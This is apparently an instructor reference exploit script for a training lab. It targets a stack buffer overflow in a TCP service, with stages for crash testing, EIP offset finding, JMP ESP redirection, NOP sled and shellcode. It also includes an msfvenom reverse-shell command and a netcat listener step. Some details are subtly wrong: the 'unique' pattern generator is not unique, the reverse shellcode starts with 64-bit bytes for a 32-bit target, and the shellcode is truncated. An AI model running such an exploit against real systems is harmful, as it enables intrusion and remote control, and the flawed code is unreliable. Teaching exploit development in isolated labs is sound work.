#!/usr/bin/env python3
"""
OSED Lab 1: Vanilla Stack Buffer Overflow - Reference Exploit
=============================================================

This is the instructor reference exploit for Lab 1.
Students should develop their own version following the lab guide.

Target: Vulnerable TCP server on port 9999
Vulnerability: Stack buffer overflow in handle_client() function
Buffer size: 512 bytes
Architecture: 32-bit (simulated Windows 7)
Protections: NONE (ASLR, DEP, Stack Canaries disabled)

Author: CyberLab Platform
Date: 2024
"""

import socket
import struct
import sys
import time

# Lab configuration
TARGET_IP = "10.13.{user_id}.10"  # Replace {user_id} with actual ID
TARGET_PORT = 9999
ATTACKER_IP = "10.13.{user_id}.1"  # Replace {user_id} with actual ID
LISTEN_PORT = 4444

# Buffer overflow details
BUFFER_SIZE = 512
EIP_OFFSET = 524  # Found through pattern analysis

# JMP ESP address (example - may vary)
# This would be found using a debugger or ROP gadget finder
JMP_ESP_ADDRESS = 0x7c9d30d7  # Example Windows system32 address

class VanillaExploit:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.offset = EIP_OFFSET
        self.jmp_esp = struct.pack("<L", JMP_ESP_ADDRESS)
        
    def generate_pattern(self, length):
        """Generate a unique pattern for offset finding"""
        pattern = ""
        chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        for i in range(length):
            pattern += chars[i % len(chars)]
        return pattern.encode()
    
    def connect_to_target(self):
        """Establish connection to vulnerable service"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((self.target_ip, self.target_port))
            
            # Receive welcome banner
            banner = s.recv(1024)
            print(f"[+] Connected to target: {banner.decode().strip()}")
            return s
            
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return None
    
    def test_basic_overflow(self):
        """Test basic buffer overflow with increasing payload sizes"""
        print("[*] Testing basic buffer overflow...")
        
        test_sizes = [100, 300, 500, 600, 700, 800]
        
        for size in test_sizes:
            s = self.connect_to_target()
            if not s:
                continue
                
            try:
                payload = "A" * size
                s.send(payload.encode() + b"\n")
                
                response = s.recv(1024)
                print(f"[+] Size {size}: {response.decode().strip()}")
                s.close()
                
            except Exception as e:
                print(f"[!] Size {size}: Connection error - likely crashed")
                if s:
                    s.close()
                    
            time.sleep(1)  # Brief pause between tests
    
    def find_eip_offset(self):
        """Send unique pattern to find EIP offset"""
        print(f"[*] Finding EIP offset using pattern...")
        
        # Generate unique pattern
        pattern = self.generate_pattern(800)
        
        s = self.connect_to_target()
        if not s:
            return False
            
        try:
            s.send(pattern + b"\n")
            s.close()
            
            print(f"[+] Pattern sent. Expected EIP offset: {self.offset}")
            print("[!] Check crash logs or debugger for exact EIP value")
            return True
            
        except Exception as e:
            print(f"[-] Pattern test failed: {e}")
            if s:
                s.close()
            return False
    
    def verify_eip_control(self):
        """Verify we can control EIP register"""
        print("[*] Verifying EIP control...")
        
        # Build control payload
        payload = (
            b"A" * self.offset +    # Fill buffer to EIP
            b"BBBB" +               # EIP control (should be 0x42424242)
            b"C" * 100              # Extra data after EIP
        )
        
        s = self.connect_to_target()
        if not s:
            return False
            
        try:
            s.send(payload + b"\n")
            s.close()
            
            print(f"[+] EIP control payload sent")
            print(f"[!] EIP should contain 0x42424242 (BBBB)")
            return True
            
        except Exception as e:
            print(f"[-] EIP control test failed: {e}")
            if s:
                s.close()
            return False
    
    def generate_shellcode(self, payload_type="reverse"):
        """Generate shellcode for the exploit"""
        # This is example shellcode - in practice, use msfvenom:
        # msfvenom -p windows/shell_reverse_tcp LHOST=10.13.X.1 LPORT=4444 -f python -b "\x00\x0a\x0d"
        
        if payload_type == "reverse":
            # Reverse shell shellcode (example - replace with real)
            shellcode = (
                b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
                b"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
                b"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
                # ... (truncated for space - use real msfvenom output)
            )
        else:
            # Simple calc.exe shellcode for testing
            shellcode = (
                b"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47"
                b"\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7"
                # ... (example calc shellcode)
            )
        
        return shellcode
    
    def build_exploit_payload(self, shellcode_type="calc"):
        """Build the complete exploit payload"""
        print(f"[*] Building exploit payload...")
        
        # Generate shellcode
        shellcode = self.generate_shellcode(shellcode_type)
        
        # Build complete payload
        nop_sled = b"\x90" * 32  # NOP sled for reliability
        
        payload = (
            b"A" * self.offset +     # Fill buffer to EIP
            self.jmp_esp +           # JMP ESP instruction address
            nop_sled +               # NOP sled
            shellcode                # Our shellcode
        )
        
        print(f"[+] Payload built:")
        print(f"    - Buffer padding: {self.offset} bytes")
        print(f"    - JMP ESP address: 0x{JMP_ESP_ADDRESS:08x}")
        print(f"    - NOP sled: {len(nop_sled)} bytes")
        print(f"    - Shellcode: {len(shellcode)} bytes")
        print(f"    - Total payload: {len(payload)} bytes")
        
        return payload
    
    def exploit_target(self, shellcode_type="calc"):
        """Execute the complete exploit"""
        print("\n" + "="*50)
        print("OSED LAB 1: VANILLA EXPLOIT EXECUTION")
        print("="*50)
        
        if shellcode_type == "reverse":
            print(f"[!] Set up your netcat listener first:")
            print(f"    nc -nvlp {LISTEN_PORT}")
            input("[?] Press Enter when listener is ready...")
        
        # Build exploit payload
        payload = self.build_exploit_payload(shellcode_type)
        
        # Connect to target
        print(f"[*] Connecting to {self.target_ip}:{self.target_port}")
        s = self.connect_to_target()
        if not s:
            return False
        
        try:
            # Send exploit payload
            print(f"[*] Sending exploit payload ({len(payload)} bytes)...")
            s.send(payload + b"\n")
            
            print(f"[+] Exploit payload sent successfully!")
            
            if shellcode_type == "reverse":
                print(f"[!] Check your netcat listener for shell connection")
            else:
                print(f"[!] Check target for calc.exe or other payload execution")
            
            s.close()
            return True
            
        except Exception as e:
            print(f"[-] Exploit failed: {e}")
            if s:
                s.close()
            return False

def main():
    """Main exploitation routine"""
    print("OSED Lab 1: Vanilla Stack Buffer Overflow")
    print("==========================================")
    print(f"Target: {TARGET_IP}:{TARGET_PORT}")
    print()
    
    # Initialize exploit class
    exploit = VanillaExploit(TARGET_IP, TARGET_PORT)
    
    if len(sys.argv) < 2:
        print("Usage: python3 reference-exploit.py [action]")
        print()
        print("Actions:")
        print("  test      - Test basic buffer overflow")
        print("  pattern   - Send pattern to find EIP offset")
        print("  control   - Verify EIP control")
        print("  exploit   - Execute full exploit (calc.exe)")
        print("  shell     - Execute reverse shell exploit")
        print("  auto      - Run all tests automatically")
        return
    
    action = sys.argv[1].lower()
    
    if action == "test":
        exploit.test_basic_overflow()
        
    elif action == "pattern":
        exploit.find_eip_offset()
        
    elif action == "control":
        exploit.verify_eip_control()
        
    elif action == "exploit":
        exploit.exploit_target("calc")
        
    elif action == "shell":
        exploit.exploit_target("reverse")
        
    elif action == "auto":
        print("[*] Running automated exploitation sequence...")
        print()
        
        # Step 1: Test basic overflow
        exploit.test_basic_overflow()
        print()
        
        # Step 2: Find EIP offset
        exploit.find_eip_offset()
        print()
        
        # Step 3: Verify EIP control
        exploit.verify_eip_control()
        print()
        
        # Step 4: Execute exploit
        print("[?] Ready to execute exploit? (y/n): ", end="")
        if input().lower() == 'y':
            exploit.exploit_target("calc")
    
    else:
        print(f"[-] Unknown action: {action}")
        print("[-] Use 'python3 reference-exploit.py' for help")

if __name__ == "__main__":
    main()